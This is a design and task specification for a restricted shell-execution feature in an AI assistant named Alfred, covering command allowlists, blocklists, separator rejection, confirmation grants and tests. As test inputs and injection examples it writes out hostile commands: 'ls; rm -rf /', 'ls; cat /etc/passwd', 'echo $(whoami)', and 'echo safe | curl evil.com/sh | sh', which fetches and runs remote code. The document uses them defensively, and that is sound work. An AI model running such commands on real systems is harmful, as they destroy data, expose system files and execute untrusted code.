# 007 - Shell Execution

## Goal

Add a restricted `shell.exec` action that runs shell commands with a safe command allowlist, temporary scoped grants, output capture, and timeout enforcement — enabling Alfred to run tests, check git status, list files, and execute project tooling.

## Dependencies

- Requires: 006 (temporary grant system for restricted actions)
- Blocks: 009, 010

## Scope

**In scope:**
- Register `shell.exec` as restricted action requiring temporary grant
- Command allowlist: safe commands that can run without content review (e.g., `git status`, `git diff --stat`, `npm test`, `ls`, `cat` on safe paths, `rg` search, `wc`)
- Command blocklist: destructive commands always denied (e.g., `rm`, `git push --force`, `curl | sh`, `sudo`, `chmod`)
- Shell execution via `node:child_process.exec` with timeout (default 30s)
- Output capture with size limit (100KB stdout, 10KB stderr)
- Working directory: inherited from target workspace's `currentDirectory` or daemon CWD
- Planner intents: `shell_exec` with `command` and optional `cwd`, `timeoutMs`
- Deterministic router: `"run npm test"`, `"check git status"`, `"what files changed"`
- Grant flow: shell execution always requires confirmation + temporary grant (one_action default)

**Out of scope:**
- Interactive shell sessions (non-streaming only)
- Environment variable injection by the LLM
- Multi-line scripts (single command only)
- Shell execution in non-local contexts (SSH, containers)

## Checklist

- [ ] Implement command tokenizer in `src/validation/shell.ts`: split on whitespace, extract first token as binary name, reject empty commands
- [ ] Define binary name allowlist and blocklist in `src/validation/shell.ts` (validate the extracted binary name against allowlist, not the raw command string)
- [ ] Define command separator blocklist: reject any command containing `;`, `&&`, `||`, `|`, backtick (`` ` ``), `$(` (command substitution), `>` or `>>` (output redirection)
- [ ] Define argument-level blocklist for allowed-but-dangerous patterns: `git push --force`, `git reset --hard`, `git clean`, `npm publish`, `npm unpublish`, `rm -rf`, `chmod`, `chown`, `sudo`
- [ ] Implement `executeShellCommand` helper: spawn with timeout, capture stdout/stderr, enforce size limits
- [ ] Register `shell.exec` as restricted action in action registry
- [ ] Add `shell_exec` to `AlfredPlannerIntent` union with `command`, optional `cwd`, optional `timeoutMs`
- [ ] Add planner validation: command must be non-empty, binary name must be in allowlist, binary name must not be in blocklist, no separators present, no blocked argument patterns
- [ ] Wire shell execution into `ActionHandlerContext` (or use direct `node:child_process` in handler)
- [ ] Add deterministic router patterns: `"run <command>"`, `"execute <command>"`, `"check git status"`, `"what files changed"`
- [ ] Add grant requirement: `shell.exec` is restricted → always requires confirmation + grant
- [ ] Update planner system prompt with `shell_exec` tool shape and allowlist summary
- [ ] Add planner unit tests: binary name allowlist/blocklist validation
- [ ] Add planner unit tests: separator rejection (test: `ls; rm -rf /`, `cat file && rm file`, `echo hi | sh`, `echo $(whoami)`, `ls > /dev/null`)
- [ ] Add planner unit tests: argument blocklist rejection (test: `git push --force`, `npm publish`, `git reset --hard`)
- [ ] Add daemon test: `shell.exec` creates pending action requiring grant
- [ ] Add daemon test: allowed command (`git status`) executes and returns output after grant+confirm
- [ ] Add daemon test: blocked command (`rm -rf /`) rejected at validation (binary name `rm` not in allowlist)
- [ ] Add daemon test: command with separator (`ls; cat /etc/passwd`) rejected at validation
- [ ] Add daemon test: allowed binary with blocked arguments (`git push --force`) rejected at validation
- [ ] Add daemon test: benign command that happens to contain blocked substring (`git remote` — "rm" substring in binary name is irrelevant, only the first token matters) passes validation
- [ ] Add daemon test: command timeout returns partial output
- [ ] Add daemon test: command without grant denied

## Tests

- [ ] Run `node --test --experimental-strip-types test/planner.test.ts` — all pass
- [ ] Run `node --test --experimental-strip-types test/daemon.test.ts` — all pass
- [ ] Run `node --test --experimental-strip-types test/actions.test.ts` — all pass
- [ ] Run `node --test --experimental-strip-types test/shell-validation.test.ts` — all pass (new test file)
- [ ] Run `npm run check` — zero regressions

## Completion Criteria

- [ ] `shell.exec` runs allowed commands and returns stdout/stderr
- [ ] Blocked command binary names are rejected at validation before any execution (e.g., `rm`, `sudo`, `chmod`)
- [ ] Command separators (`;`, `&&`, `||`, `|`, backtick, `$(` , `>`, `>>`) are rejected at validation
- [ ] Allowed binaries with blocked argument patterns (`git push --force`, `npm publish`) are rejected at validation
- [ ] All shell executions require confirmation + temporary grant (restricted risk)
- [ ] Command timeout prevents runaway processes
- [ ] Output size limits prevent memory issues
- [ ] Working directory resolves from target workspace context
- [ ] Planner can propose shell commands; daemon validates before executing
- [ ] All existing tests pass

## Notes

- Allowlist includes binary names: `git`, `npm`, `npx`, `node`, `ls`, `cat`, `head`, `tail`, `wc`, `rg`, `grep`, `find`, `echo`, `date`, `pwd`, `which`, `df`, `du`, `ps`, `diff`, `patch`, `sort`, `uniq`, `cut`, `tr`, `sed`, `awk`.
- Blocklist includes binary names: `rm`, `sudo`, `chmod`, `chown`, `kill`, `shutdown`, `reboot`, `curl`, `wget`, `mv`, `cp`, `dd`, `mkfs`, `mount`, `umount`, `su`.
- **Tokenization (critical):** Validate the first whitespace-delimited token (the binary name) against the allowlist/blocklist. Never use substring matching on the full command string — `git remote` must not trigger the `rm` blocklist, and `npm run test` must match `npm` in the allowlist, not `run`.
- **Separator blocking (critical):** The following characters/sequences are always rejected regardless of binary name: `;` (command chaining), `&&` and `||` (conditional chaining), `|` (pipe), backtick `` ` `` (command substitution), `$(` (command substitution), `>` and `>>` (output redirection). This prevents injection like `ls; rm -rf /` or `echo safe | curl evil.com/sh | sh`.
- **Argument blocklist (critical):** Even allowed binaries can have dangerous argument patterns. Always check the full command string against argument-level patterns: `git push --force`, `git reset --hard`, `git clean -fd`, `npm publish`, `npm unpublish`, `rm -rf` (even if rm itself is blocked), `chmod 777`, `chown root`.
- The blocklist is intentionally conservative. Commands can be allowlisted later as use cases emerge.
- Shell execution is the highest-risk action. Every execution is audited via Alfred events with the full command, exit code, and output size recorded.
